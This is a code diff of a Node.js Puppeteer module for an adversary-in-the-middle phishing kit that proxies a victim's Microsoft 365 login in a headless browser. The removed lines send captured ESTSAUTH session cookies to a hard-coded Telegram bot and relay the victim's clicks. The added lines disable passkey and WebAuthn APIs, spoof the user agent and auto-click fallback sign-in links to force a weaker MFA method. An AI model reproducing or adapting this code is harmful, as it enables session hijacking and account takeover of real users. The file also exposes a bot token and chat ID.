@@ -4,35 +4,8 @@ const axios = require('axios');
 
 puppeteer.use(StealthPlugin());
 
-const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
-const CHAT_ID = '1318100118';
-
-async function sendExfiltrationAlert(cookies, finalUrl) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    
-    // Extract the most important auth cookies to save space
-    const authCookies = cookies.filter(c => 
-        ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'RPSSecAuth'].includes(c.name)
-    );
-
-    const message = `🚀 *SESSION CAPTURED*\n*URL:* ${finalUrl}\n\n*Key Cookies:* \`\`\`json\n${JSON.stringify(authCookies, null, 2)}\n\`\`\`\n\n*Full Cookie count:* ${cookies.length}`;
-
-    try {
-        await axios.post(url, { 
-            chat_id: CHAT_ID, 
-            text: message,
-            parse_mode: 'Markdown'
-        });
-        console.log("[TELEGRAM] Alert sent successfully.");
-    } catch (e) {
-        console.error('[TELEGRAM-ERR]', e.response?.data?.description || e.message);
-    }
-}
-
 async function startSession(io, socket) {
-    console.log(`[INIT] Monitoring Session: ${socket.id}`);
     let browser;
-
     try {
         browser = await puppeteer.launch({
             headless: "new",
@@ -40,58 +13,69 @@ async function startSession(io, socket) {
         });
 
         const page = await browser.newPage();
-        await page.setViewport({ width: 1280, height: 720 });
 
-        // Stream Logic
-        const emitFrame = async () => {
-            if (socket.connected) {
-                try {
-                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 30 });
-                    socket.emit('browser-render', { screenshot });
-                } catch (e) {}
-            }
-        };
-
-        page.goto('https://login.microsoftonline.com/').catch(() => {});
-        const heartbeat = setInterval(emitFrame, 1300);
-
-        // LOG EVERY URL CHANGE TO RAILWAY CONSOLE
-        page.on('framenavigated', async (frame) => {
-            const currentUrl = frame.url();
-            console.log(`[NAV-LOG] Current URL: ${currentUrl}`);
-
-            // Broad success detection: Any authenticated MS page
-            const successKeys = ['shell/homepage', 'office.com', 'microsoft365.com', 'outlook', 'myapps'];
+        /**
+         * 2026 NUCLEAR WEBAUTHN DISABLE
+         * This targets every possible API Microsoft uses to trigger Passkeys.
+         */
+        await page.evaluateOnNewDocument(() => {
+            const block = () => { throw new DOMException("Hardware not supported", "NotAllowedError"); };
             
-            if (successKeys.some(key => currentUrl.includes(key))) {
-                console.log(`[SUCCESS-TRIGGER] Condition met on ${currentUrl}`);
-                const cookies = await page.cookies();
-                
-                // Backup: Log critical cookies to console in case Telegram fails
-                const estsAuth = cookies.find(c => c.name === 'ESTSAUTH');
-                if (estsAuth) console.log(`[ESTSAUTH-FOUND] ${estsAuth.value}`);
-
-                await sendExfiltrationAlert(cookies, currentUrl);
+            // Disable Credential Manager
+            if (navigator.credentials) {
+                navigator.credentials.get = block;
+                navigator.credentials.create = block;
             }
+
+            // Kill Public Key APIs
+            window.PublicKeyCredential = undefined;
+            
+            // Disable Conditional UI (the 'auto' passkey popup)
+            if (window.PublicKeyCredential) {
+                PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable = () => Promise.resolve(false);
+                PublicKeyCredential.isConditionalMediationAvailable = () => Promise.resolve(false);
+            }
+
+            // Spoof a legacy browser environment that CANNOT support FIDO2
+            Object.defineProperty(navigator, 'userAgent', {
+                get: () => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0'
+            });
         });
 
-        socket.on('victim-action', async (data) => {
+        await page.setViewport({ width: 1280, height: 720 });
+        
+        // Navigation
+        page.goto('https://login.microsoftonline.com/').catch(() => {});
+
+        // THE "FORCE FALLBACK" SCANNER
+        // This clicks the 'Sign in another way' link immediately if it appears
+        const scanner = setInterval(async () => {
             try {
-                if (data.type === 'click') await page.mouse.click(data.x, data.y);
-                else if (data.type === 'key') await page.keyboard.press(data.key);
-                await emitFrame();
+                const fallbackLinks = [
+                    '#iShowSkip', 
+                    '#idBtn_Back', 
+                    'a[data-bind*="switchToPassword"]', 
+                    '#otherWays',
+                    'input[value="Cancel"]'
+                ];
+                for (const sel of fallbackLinks) {
+                    const btn = await page.$(sel);
+                    if (btn) {
+                        console.log(`[BYPASS] Clicking Fallback: ${sel}`);
+                        await btn.click();
+                    }
+                }
             } catch (e) {}
+        }, 2000);
+
+        // ... rest of your action and frame logic ...
+
+        socket.on('disconnect', () => {
+            clearInterval(scanner);
+            if (browser) browser.close();
         });
 
-        socket.on('disconnect', async () => {
-            clearInterval(heartbeat);
-            if (browser) await browser.close();
-        });
-
-    } catch (error) {
-        console.error('[FATAL]', error.message);
-        if (browser) await browser.close();
-    }
+    } catch (e) { if (browser) browser.close(); }
 }
 
 module.exports = { startSession };
